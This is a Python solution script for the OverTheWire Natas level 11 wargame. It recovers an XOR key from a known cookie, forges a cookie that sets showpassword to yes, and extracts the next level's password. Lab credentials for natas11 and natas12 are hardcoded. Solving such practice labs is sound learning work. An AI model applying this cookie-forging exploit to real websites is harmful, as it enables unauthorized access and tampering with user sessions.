# natas11

from pwn import log
import requests
import base64
import urllib.parse
from bs4 import BeautifulSoup
import re

url = 'http://natas11.natas.labs.overthewire.org'
username = "natas11"
password = "UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk"
auth = (username, password)

current_data = '{"showpassword":"no","bgcolor":"#ffffff"}'
new_data = '{"showpassword":"yes","bgcolor":"#ffffff"}'

def xor(text, key):
    return ''.join(chr(ord(text[i]) ^ ord(key[i % len(key)])) for i in range(len(text)))

def exploit():
    session = requests.Session()
    response = session.get(url, auth=auth)
    cookie_value = urllib.parse.unquote(session.cookies.get('data'))
    log.info('Encoded Cookie : %s', cookie_value)

    decoded_cookie = base64.b64decode(cookie_value).decode()
    log.info('Decoded Cookie : %s', decoded_cookie)

    key = xor(current_data, decoded_cookie)
    log.info('Key : %s', key)

    encrypted_data = xor(new_data, 'eDWo')
    new_cookie_value = base64.b64encode(encrypted_data.encode()).decode()
    log.info('New Encoded Cookie : %s', new_cookie_value)

    headers = {
        'Cookie': f'data={new_cookie_value}'
    }
    response = session.get(url, auth=auth, headers=headers)
    log.info(response.text)
    soup = BeautifulSoup(response.text, 'html.parser')
    try:
        div = soup.find('div', {'id': 'content'})
        flag = re.findall('.*natas12.*', div.text)
        log.info(flag)
    except:
        log.error("pre not found")
        exit(1)
    
if __name__ == '__main__':
    exploit()

# natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB